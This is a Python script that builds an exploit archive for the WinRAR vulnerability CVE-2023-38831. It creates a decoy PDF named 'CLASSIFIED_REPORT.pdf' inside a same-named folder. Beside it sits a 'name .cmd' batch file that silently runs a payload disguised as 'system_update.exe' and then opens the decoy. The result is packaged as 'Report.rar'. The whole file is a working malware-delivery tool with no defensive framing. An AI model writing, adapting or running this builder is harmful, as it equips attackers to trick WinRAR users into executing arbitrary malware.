
import os
import shutil
import zipfile
import sys

def create_exploit_archive(bait_name, payload_path, output_name="exploit.zip"):
    """
    Creates a CVE-2023-38831 exploit archive.
    Structure:
    root/
      bait_name (Dir)
        bait_name (File - The distraction)
        bait_name .cmd (File - The payload launcher)
    """
    
    # Clean up temp
    temp_dir = "temp_exploit_build"
    if os.path.exists(temp_dir):
        shutil.rmtree(temp_dir)
    os.makedirs(temp_dir)

    # 1. Create the decoy directory (must match bait filename exactly)
    decoy_dir = os.path.join(temp_dir, bait_name)
    os.makedirs(decoy_dir)

    # 2. Create the dummy bait file (user would verify this, we make a blank one)
    # Ideally checking extension to know if it should be empty text or binary
    with open(os.path.join(decoy_dir, bait_name), "wb") as f:
        f.write(b"%PDF-1.4\n%EOF") # Mock PDF header

    # 3. Create the payload loader
    # The vulnerability executes the file with same name + space + extension
    # We will create a .cmd that launches the payload (assumed to be packed or downloaded)
    # For this standalone POC, we'll assume the user drops their 'system_update.exe' here too
    # OR we can just embed the exe bytes.
    
    # Strategy: Hiding the real payload in the folder too, hidden, and the .cmd runs it.
    
    payload_name = "system_update.exe"
    
    # Start of the batch script (bait_name .cmd)
    batch_content = f"""@echo off
if not exist "{payload_name}" (
    echo Payload missing.
    exit
)
start "" "{payload_name}"
start "" "{bait_name}"
"""
    
    # The exploit file: "filename.pdf .cmd"
    exploit_filename = f"{bait_name} .cmd"
    with open(os.path.join(decoy_dir, exploit_filename), "w") as f:
        f.write(batch_content)

    # Copy the actual payload exe into the folder so the batch can find it
    if os.path.exists(payload_path):
        shutil.copy2(payload_path, os.path.join(decoy_dir, payload_name))
    else:
        print(f"[-] Warning: Payload {payload_path} not found. Creating dummy.")
        with open(os.path.join(decoy_dir, payload_name), "wb") as f:
            f.write(b"MSDOS..") # Mock header

    # 4. Zip it up
    print(f"[*] Creating archive {output_name}...")
    with zipfile.ZipFile(output_name, 'w', zipfile.ZIP_DEFLATED) as zipf:
        for root, dirs, files in os.walk(temp_dir):
            for file in files:
                abs_path = os.path.join(root, file)
                rel_path = os.path.relpath(abs_path, temp_dir)
                zipf.write(abs_path, rel_path)
    
    # Cleanup
    shutil.rmtree(temp_dir)
    print(f"[+] Exploit archive created: {output_name}")

if __name__ == "__main__":
    # Example Usage
    create_exploit_archive(
        bait_name="CLASSIFIED_REPORT.pdf", 
        payload_path="dist/system_update.exe",  # User needs to build this
        output_name="Report.rar" # WinRAR opens ZIPs as RARs often fine, or just .zip
    )
